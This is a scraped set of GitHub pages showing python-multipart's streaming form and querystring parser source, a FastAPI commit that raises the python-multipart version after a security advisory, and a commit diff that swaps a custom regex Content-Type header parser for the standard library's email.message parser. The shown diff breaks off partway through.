 options['suffix'] = ext if file\_dir is not None: d = file\_dir if isinstance(d, bytes): d = d.decode(sys.getfilesystemencoding())
 options['dir'] = d options['delete'] = delete\_tmp
 # Create a temporary (named) file with the appropriate settings. self.logger.info("Creating a temporary file with options: %r", options) try: tmp\_file = tempfile.NamedTemporaryFile(\*\*options) except OSError: self.logger.exception("Error creating named temporary file") raise FileError("Error creating named temporary file")
 fname = tmp\_file.name
 # Encode filename as bytes. if isinstance(fname, str): fname = fname.encode(sys.getfilesystemencoding())
 self.\_actual\_file\_name = fname return tmp\_file
 def write(self, data): """Write some data to the File.
 :param data: a bytestring """ return self.on\_data(data)
 def on\_data(self, data): """This method is a callback that will be called whenever data is written to the File.
 :param data: a bytestring """ pos = self.\_fileobj.tell() bwritten = self.\_fileobj.write(data) # true file objects write returns None if bwritten is None: bwritten = self.\_fileobj.tell() - pos
 # If the bytes written isn't the same as the length, just return. if bwritten != len(data): self.logger.warning("bwritten != len(data) (%d != %d)", bwritten, len(data)) return bwritten
 # Keep track of how many bytes we've written. self.\_bytes\_written += bwritten
 # If we're in-memory and are over our limit, we create a file. if (self.\_in\_memory and self.\_config.get('MAX\_MEMORY\_FILE\_SIZE') is not None and (self.\_bytes\_written > self.\_config.get('MAX\_MEMORY\_FILE\_SIZE'))): self.logger.info("Flushing to disk") self.flush\_to\_disk()
 # Return the number of bytes written. return bwritten
 def on\_end(self): """This method is called whenever the Field is finalized. """ # Flush the underlying file object self.\_fileobj.flush()
 def finalize(self): """Finalize the form file. This will not close the underlying file, but simply signal that we are finished writing to the File. """ self.on\_end()
 def close(self): """Close the File object. This will actually close the underlying file object (whether it's a :class:`io.BytesIO` or an actual file object). """ self.\_fileobj.close()
 def \_\_repr\_\_(self): return "{}(file\_name={!r}, field\_name={!r})".format( self.\_\_class\_\_.\_\_name\_\_, self.file\_name, self.field\_name )
class BaseParser: """This class is the base class for all parsers. It contains the logic for calling and adding callbacks.
 A callback can be one of two different forms. "Notification callbacks" are callbacks that are called when something happens - for example, when a new part of a multipart message is encountered by the parser. "Data callbacks" are called when we get some sort of data - for example, part of the body of a multipart chunk. Notification callbacks are called with no parameters, whereas data callbacks are called with three, as follows::
 data\_callback(data, start, end)
 The "data" parameter is a bytestring (i.e. "foo" on Python 2, or b"foo" on Python 3). "start" and "end" are integer indexes into the "data" string that represent the data of interest. Thus, in a data callback, the slice `data[start:end]` represents the data that the callback is "interested in". The callback is not passed a copy of the data, since copying severely hurts performance. """ def \_\_init\_\_(self): self.logger = logging.getLogger(\_\_name\_\_)
 def callback(self, name, data=None, start=None, end=None): """This function calls a provided callback with some data. If the callback is not set, will do nothing.
 :param name: The name of the callback to call (as a string).
 :param data: Data to pass to the callback. If None, then it is assumed that the callback is a notification callback, and no parameters are given.
 :param end: An integer that is passed to the data callback.
 :param start: An integer that is passed to the data callback. """ name = "on\_" + name func = self.callbacks.get(name) if func is None: return
 # Depending on whether we're given a buffer... if data is not None: # Don't do anything if we have start == end. if start is not None and start == end: return
 self.logger.debug("Calling %s with data[%d:%d]", name, start, end) func(data, start, end) else: self.logger.debug("Calling %s with no data", name) func()
 def set\_callback(self, name, new\_func): """Update the function for a callback. Removes from the callbacks dict if new\_func is None.
 :param name: The name of the callback to call (as a string).
 :param new\_func: The new function for the callback. If None, then the callback will be removed (with no error if it does not exist). """ if new\_func is None: self.callbacks.pop('on\_' + name, None) else: self.callbacks['on\_' + name] = new\_func
 def close(self): pass # pragma: no cover
 def finalize(self): pass # pragma: no cover
 def \_\_repr\_\_(self): return "%s()" % self.\_\_class\_\_.\_\_name\_\_
class OctetStreamParser(BaseParser): """This parser parses an octet-stream request body and calls callbacks when incoming data is received. Callbacks are as follows:
 .. list-table:: :widths: 15 10 30 :header-rows: 1
 \* - Callback Name - Parameters - Description \* - on\_start - None - Called when the first data is parsed. \* - on\_data - data, start, end - Called for each data chunk that is parsed. \* - on\_end - None - Called when the parser is finished parsing all data.
 :param callbacks: A dictionary of callbacks. See the documentation for :class:`BaseParser`.
 :param max\_size: The maximum size of body to parse. Defaults to infinity - i.e. unbounded. """ def \_\_init\_\_(self, callbacks={}, max\_size=float('inf')): super().\_\_init\_\_() self.callbacks = callbacks self.\_started = False
 if not isinstance(max\_size, Number) or max\_size < 1: raise ValueError("max\_size must be a positive number, not %r" % max\_size) self.max\_size = max\_size self.\_current\_size = 0
 def write(self, data): """Write some data to the parser, which will perform size verification, and then pass the data to the underlying callback.
 :param data: a bytestring """ if not self.\_started: self.callback('start') self.\_started = True
 # Truncate data length. data\_len = len(data) if (self.\_current\_size + data\_len) > self.max\_size: # We truncate the length of data that we are to process. new\_size = int(self.max\_size - self.\_current\_size) self.logger.warning("Current size is %d (max %d), so truncating " "data length from %d to %d", self.\_current\_size, self.max\_size, data\_len, new\_size) data\_len = new\_size
 # Increment size, then callback, in case there's an exception. self.\_current\_size += data\_len self.callback('data', data, 0, data\_len) return data\_len
 def finalize(self): """Finalize this parser, which signals to that we are finished parsing, and sends the on\_end callback. """ self.callback('end')
 def \_\_repr\_\_(self): return "%s()" % self.\_\_class\_\_.\_\_name\_\_
class QuerystringParser(BaseParser): """This is a streaming querystring parser. It will consume data, and call the callbacks given when it has data.
 .. list-table:: :widths: 15 10 30 :header-rows: 1
 \* - Callback Name - Parameters - Description \* - on\_field\_start - None - Called when a new field is encountered. \* - on\_field\_name - data, start, end - Called when a portion of a field's name is encountered. \* - on\_field\_data - data, start, end - Called when a portion of a field's data is encountered. \* - on\_field\_end - None - Called when the end of a field is encountered. \* - on\_end - None - Called when the parser is finished parsing all data.
 :param callbacks: A dictionary of callbacks. See the documentation for :class:`BaseParser`.
 :param strict\_parsing: Whether or not to parse the body strictly. Defaults to False. If this is set to True, then the behavior of the parser changes as the following: if a field has a value with an equal sign (e.g. "foo=bar", or "foo="), it is always included. If a field has no equals sign (e.g. "...&name&..."), it will be treated as an error if 'strict\_parsing' is True, otherwise included. If an error is encountered, then a :class:`multipart.exceptions.QuerystringParseError` will be raised.
 :param max\_size: The maximum size of body to parse. Defaults to infinity - i.e. unbounded. """ def \_\_init\_\_(self, callbacks={}, strict\_parsing=False, max\_size=float('inf')): super().\_\_init\_\_() self.state = STATE\_BEFORE\_FIELD self.\_found\_sep = False
 self.callbacks = callbacks
 # Max-size stuff if not isinstance(max\_size, Number) or max\_size < 1: raise ValueError("max\_size must be a positive number, not %r" % max\_size) self.max\_size = max\_size self.\_current\_size = 0
 # Should parsing be strict? self.strict\_parsing = strict\_parsing
 def write(self, data): """Write some data to the parser, which will perform size verification, parse into either a field name or value, and then pass the corresponding data to the underlying callback. If an error is encountered while parsing, a QuerystringParseError will be raised. The "offset" attribute of the raised exception will be set to the offset in the input data chunk (NOT the overall stream) that caused the error.
 :param data: a bytestring """ # Handle sizing. data\_len = len(data) if (self.\_current\_size + data\_len) > self.max\_size: # We truncate the length of data that we are to process. new\_size = int(self.max\_size - self.\_current\_size) self.logger.warning("Current size is %d (max %d), so truncating " "data length from %d to %d", self.\_current\_size, self.max\_size, data\_len, new\_size) data\_len = new\_size
 l = 0 try: l = self.\_internal\_write(data, data\_len) finally: self.\_current\_size += l
 return l
 def \_internal\_write(self, data, length): state = self.state strict\_parsing = self.strict\_parsing found\_sep = self.\_found\_sep
 i = 0 while i < length: ch = data[i]
 # Depending on our state... if state == STATE\_BEFORE\_FIELD: # If the 'found\_sep' flag is set, we've already encountered # and skipped a single separator. If so, we check our strict # parsing flag and decide what to do. Otherwise, we haven't # yet reached a separator, and thus, if we do, we need to skip # it as it will be the boundary between fields that's supposed # to be there. if ch == AMPERSAND or ch == SEMICOLON: if found\_sep: # If we're parsing strictly, we disallow blank chunks. if strict\_parsing: e = QuerystringParseError( "Skipping duplicate ampersand/semicolon at " "%d" % i ) e.offset = i raise e else: self.logger.debug("Skipping duplicate ampersand/" "semicolon at %d", i) else: # This case is when we're skipping the (first) # separator between fields, so we just set our flag # and continue on. found\_sep = True else: # Emit a field-start event, and go to that state. Also, # reset the "found\_sep" flag, for the next time we get to # this state. self.callback('field\_start') i -= 1 state = STATE\_FIELD\_NAME found\_sep = False
 elif state == STATE\_FIELD\_NAME: # Try and find a separator - we ensure that, if we do, we only # look for the equal sign before it. sep\_pos = data.find(b'&', i) if sep\_pos == -1: sep\_pos = data.find(b';', i)
 # See if we can find an equals sign in the remaining data. If # so, we can immediately emit the field name and jump to the # data state. if sep\_pos != -1: equals\_pos = data.find(b'=', i, sep\_pos) else: equals\_pos = data.find(b'=', i)
 if equals\_pos != -1: # Emit this name. self.callback('field\_name', data, i, equals\_pos)
 # Jump i to this position. Note that it will then have 1 # added to it below, which means the next iteration of this # loop will inspect the character after the equals sign. i = equals\_pos state = STATE\_FIELD\_DATA else: # No equals sign found. if not strict\_parsing: # See also comments in the STATE\_FIELD\_DATA case below. # If we found the separator, we emit the name and just # end - there's no data callback at all (not even with # a blank value). if sep\_pos != -1: self.callback('field\_name', data, i, sep\_pos) self.callback('field\_end')
 i = sep\_pos - 1 state = STATE\_BEFORE\_FIELD else: # Otherwise, no separator in this block, so the # rest of this chunk must be a name. self.callback('field\_name', data, i, length) i = length
 else: # We're parsing strictly. If we find a separator, # this is an error - we require an equals sign. if sep\_pos != -1: e = QuerystringParseError( "When strict\_parsing is True, we require an " "equals sign in all field chunks. Did not " "find one in the chunk that starts at %d" % (i,) ) e.offset = i raise e
 # No separator in the rest of this chunk, so it's just # a field name. self.callback('field\_name', data, i, length) i = length
 elif state == STATE\_FIELD\_DATA: # Try finding either an ampersand or a semicolon after this # position. sep\_pos = data.find(b'&', i) if sep\_pos == -1: sep\_pos = data.find(b';', i)
 # If we found it, callback this bit as data and then go back # to expecting to find a field. if sep\_pos != -1: self.callback('field\_data', data, i, sep\_pos) self.callback('field\_end')
 # Note that we go to the separator, which brings us to the # "before field" state. This allows us to properly emit # "field\_start" events only when we actually have data for # a field of some sort. i = sep\_pos - 1 state = STATE\_BEFORE\_FIELD
 # Otherwise, emit the rest as data and finish. else: self.callback('field\_data', data, i, length) i = length
 else: # pragma: no cover (error case) msg = "Reached an unknown state %d at %d" % (state, i) self.logger.warning(msg) e = QuerystringParseError(msg) e.offset = i raise e
 i += 1
 self.state = state self.\_found\_sep = found\_sep return len(data)
 def finalize(self): """Finalize this parser, which signals to that we are finished parsing, if we're still in the middle of a field, an on\_field\_end callback, and then the on\_end callback. """ # If we're currently in the middle of a field, we finish it. if self.state == STATE\_FIELD\_DATA: self.callback('field\_end') self.callback('end')
 def \_\_repr\_\_(self): return "{}(strict\_parsing={!r}, max\_size={!r})".format( self.\_\_class\_\_.\_\_name\_\_, self.strict\_parsing, self.max\_size )
class MultipartParser(BaseParser): """This class is a streaming multipart/form-data parser.
 .. list-table:: :widths: 15 10 30 :header-rows: 1
 \* - Callback Name - Parameters - Description \* - on\_part\_begin - None - Called when a new part of the multipart message is encountered. \* - on\_part\_data - data, start, end - Called when a portion of a part's data is encountered. \* - on\_part\_end - None - Called when the end of a part is reached. \* - on\_header\_begin - None - Called when we've found a new header in a part of a multipart message \* - on\_header\_field - data, start, end - Called each time an additional portion of a header is read (i.e. the part of the header that is before the colon; the "Foo" in "Foo: Bar"). \* - on\_header\_value - data, start, end - Called when we get data for a header. \* - on\_header\_end - None - Called when the current header is finished - i.e. we've reached the newline at the end of the header. \* - on\_headers\_finished - None - Called when all headers are finished, and before the part data starts. \* - on\_end - None - Called when the parser is finished parsing all data.
 :param boundary: The multipart boundary. This is required, and must match what is given in the HTTP request - usually in the Content-Type header.
 :param callbacks: A dictionary of callbacks. See the documentation for :class:`BaseParser`.
 :param max\_size: The maximum size of body to parse. Defaults to infinity - i.e. unbounded. """
 def \_\_init\_\_(self, boundary, callbacks={}, max\_size=float('inf')): # Initialize parser state. super().\_\_init\_\_() self.state = STATE\_START self.index = self.flags = 0
[View remainder of file in raw view](https://github.com/Kludex/python-multipart/raw/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d9a5eac0_20250114_181323.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffastapi%2Ffastapi%2Fcommit%2F9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffastapi%2Ffastapi%2Fcommit%2F9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=fastapi%2Ffastapi)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fastapi](/fastapi)
/
**[fastapi](/fastapi/fastapi)**
Public

* [Notifications](/login?return_to=%2Ffastapi%2Ffastapi) You must be signed in to change notification settings
* [Fork
  6.8k](/login?return_to=%2Ffastapi%2Ffastapi)
* [Star
   79.5k](/login?return_to=%2Ffastapi%2Ffastapi)

* [Code](/fastapi/fastapi)
* [Issues
  51](/fastapi/fastapi/issues)
* [Pull requests
  273](/fastapi/fastapi/pulls)
* [Discussions](/fastapi/fastapi/discussions)
* [Actions](/fastapi/fastapi/actions)
* [Projects
  0](/fastapi/fastapi/projects)
* [Security](/fastapi/fastapi/security)
* [Insights](/fastapi/fastapi/pulse)

Additional navigation options

* [Code](/fastapi/fastapi)
* [Issues](/fastapi/fastapi/issues)
* [Pull requests](/fastapi/fastapi/pulls)
* [Discussions](/fastapi/fastapi/discussions)
* [Actions](/fastapi/fastapi/actions)
* [Projects](/fastapi/fastapi/projects)
* [Security](/fastapi/fastapi/security)
* [Insights](/fastapi/fastapi/pulse)

## Commit

[Permalink](/fastapi/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-qf9m-vfgh-m389](https://github.com/advisories/GHSA-qf9m-vfgh-m389 "GHSA-qf9m-vfgh-m389")

[Browse files](/fastapi/fastapi/tree/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc)
Browse the repository at this point in the history

* Loading branch information

[![@tiangolo](https://avatars.githubusercontent.com/u/1326112?s=40&v=4)](/tiangolo)

[tiangolo](/fastapi/fastapi/commits?author=tiangolo "View all commits by tiangolo")
authored
Feb 3, 2024

1 parent
[ebf9723](/fastapi/fastapi/commit/ebf972349431043170c1f6a4550bd29642f09cd2)

commit 9d34ad0

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* pyproject.toml
  [pyproject.toml](#diff-50c86b7ed8ac2cf95bd48334961bf0530cdc77b5a56f852c5c61b89d735fd711)
* requirements-tests.txt
  [requirements-tests.txt](#diff-c258030c905004296fe46761295d5c97af8641a141156e255585e968ae7a4d1d)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[pyproject.toml](#diff-50c86b7ed8ac2cf95bd48334961bf0530cdc77b5a56f852c5c61b89d735fd711 "pyproject.toml")

Show comments

[View file](/fastapi/fastapi/blob/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc/pyproject.toml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -56,7 +56,7 @@ Repository = "https://github.com/tiangolo/fastapi" |
|  |  | all = [ |
|  |  | "httpx >=0.23.0", |
|  |  | "jinja2 >=2.11.2", |
|  |  | "python-multipart >=0.0.5", |
|  |  | "python-multipart >=0.0.7", |
|  |  | "itsdangerous >=1.1.0", |
|  |  | "pyyaml >=5.3.1", |
|  |  | "ujson >=4.0.1,!=4.0.2,!=4.1.0,!=4.2.0,!=4.3.0,!=5.0.0,!=5.1.0", |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[requirements-tests.txt](#diff-c258030c905004296fe46761295d5c97af8641a141156e255585e968ae7a4d1d "requirements-tests.txt")

Show comments

[View file](/fastapi/fastapi/blob/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc/requirements-tests.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -13,7 +13,7 @@ sqlalchemy >=1.3.18,<1.4.43 |
|  |  | databases[sqlite] >=0.3.2,<0.7.0 |
|  |  | orjson >=3.2.1,<4.0.0 |
|  |  | ujson >=4.0.1,!=4.0.2,!=4.1.0,!=4.2.0,!=4.3.0,!=5.0.0,!=5.1.0,<6.0.0 |
|  |  | python-multipart >=0.0.5,<0.0.7 |
|  |  | python-multipart >=0.0.7,<0.1.0 |
|  |  | flask >=1.1.2,<3.0.0 |
|  |  | anyio[trio] >=3.2.1,<4.0.0 |
|  |  | python-jose[cryptography] >=3.3.0,<4.0.0 |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9d34ad0`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffastapi%2Ffastapi%2Fcommit%2F9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2ea34855_20250114_181318.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fcommit%2F20f0ef6b4e4caf7d69a667c54dff57fe467109a4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fcommit%2F20f0ef6b4e4caf7d69a667c54dff57fe467109a4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Kludex%2Fpython-multipart)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Kludex](/Kludex)
/
**[python-multipart](/Kludex/python-multipart)**
Public

* [Notifications](/login?return_to=%2FKludex%2Fpython-multipart) You must be signed in to change notification settings
* [Fork
  63](/login?return_to=%2FKludex%2Fpython-multipart)
* [Star
   367](/login?return_to=%2FKludex%2Fpython-multipart)

* [Code](/Kludex/python-multipart)
* [Issues
  9](/Kludex/python-multipart/issues)
* [Pull requests
  8](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

Additional navigation options

* [Code](/Kludex/python-multipart)
* [Issues](/Kludex/python-multipart/issues)
* [Pull requests](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

## Commit

[Permalink](/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

♻️ Refactor header option parser to use the standard library instead …

[Browse files](/Kludex/python-multipart/tree/20f0ef6b4e4caf7d69a667c54dff57fe467109a4)
Browse the repository at this point in the history

```
…of a custom RegEx ([#75](https://github.com/Kludex/python-multipart/pull/75))
```

* Loading branch information

[![@tiangolo](https://avatars.githubusercontent.com/u/1326112?s=40&v=4)](/tiangolo)

[tiangolo](/Kludex/python-multipart/commits?author=tiangolo "View all commits by tiangolo")
authored
Feb 3, 2024

1 parent
[d3d16da](/Kludex/python-multipart/commit/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a)

commit 20f0ef6

Showing
**1 changed file**
with
**26 additions**
and
**24 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

50 changes: 26 additions & 24 deletions

50
[multipart/multipart.py](#diff-c1164269e516106928ebbf79b852d68284cbc9a4cf58cb864a67a029b5481d0e "multipart/multipart.py")

Show comments

[View file](/Kludex/python-multipart/blob/20f0ef6b4e4caf7d69a667c54dff57fe467109a4/multipart/multipart.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -9,6 +9,8 @@ |
|  |  | import tempfile |
|  |  | from io import BytesIO |
|  |  | from numbers import Number |
|  |  | from email.message import Message |
|  |  | from typing import Dict, Union, Tuple |
|  |  |  |
|  |  | # Unique missing object. |
|  |  | \_missing = object() |
| Expand Down  Expand Up | | @@ -76,44 +78,44 @@ |
|  |  | QUOTE = b'"'[0] |
|  |  |  |
|  |  |  |
|  |  | def parse\_options\_header(value): |
|  |  | def parse\_options\_header(value: Union[str, bytes]) -> Tuple[bytes, Dict[bytes, bytes]]: |
|  |  | """ |
|  |  | Parses a Content-Type header into a value in the following format: |
|  |  | (content\_type, {parameters}) |
|  |  | """ |
|  |  | # Uses email.message.Message to parse the header as described in PEP 594. |
|  |  | # Ref: https://peps.python.org/pep-0594/#cgi |
|  |  | if not value: |
|  |  | return (b'', {}) |
|  |  |  |
|  |  | # If we are passed a string, we assume that it conforms to WSGI and does |
|  |  | # not contain any code point that's not in latin-1. |
|  |  | if isinstance(value, str): # pragma: no cover |
|  |  | value = value.encode('latin-1') |
|  |  | # If we are passed bytes, we assume that it conforms to WSGI, encoding in latin-1. |
|  |  | if isinstance(value, bytes): # pragma: no cover |
|  |  | value = value.decode('latin-1') |
|  |  |  |
|  |  | # For types |
|  |  | assert isinstance(value, str), 'Value should be a string by now' |
|  |  |  |
|  |  | # If we have no options, return the string as-is. |
|  |  | if b';' not in value: |
|  |  | return (value.lower().strip(), {}) |
|  |  | if ";" not in value: |
|  |  | return (value.lower().strip().encode('latin-1'), {}) |
|  |  |  |
|  |  | # Split at the first semicolon, to get our value and then options. |
|  |  | ctype, rest = value.split(b';', 1) |
|  |  | # ctype, rest = value.split(b';', 1) |
|  |  | message = Message() |
|  |  | message['content-type'] = value |
|  |  | params = message.get\_params() |
|  |  | # If there were no parameters, this would have already returned above |
|  |  | assert params, 'At least the content type value should be present' |
|  |  | ctype = params.pop(0)[0].encode('latin-1') |
|  |  | options = {} |
|  |  |  |
|  |  | # Parse the options. |
|  |  | for match in OPTION\_RE.finditer(rest): |
|  |  | key = match.group(1).lower() |
|  |  | value = match.group(2) |
|  |  | if value[0] == QUOTE and value[-1] == QUOTE: |
|  |  | # Unquote the value. |
|  |  | value = value[1:-1] |
|  |  | value = value.replace(b'\\\\', b'\\').replace(b'\\"', b'"') |
|  |  |  |
|  |  | for param in params: |
|  |  | key, value = param |
|  |  | # If the value is a filename, we need to fix a bug on IE6 that sends |
|  |  | # the full file path instead of the filename. |
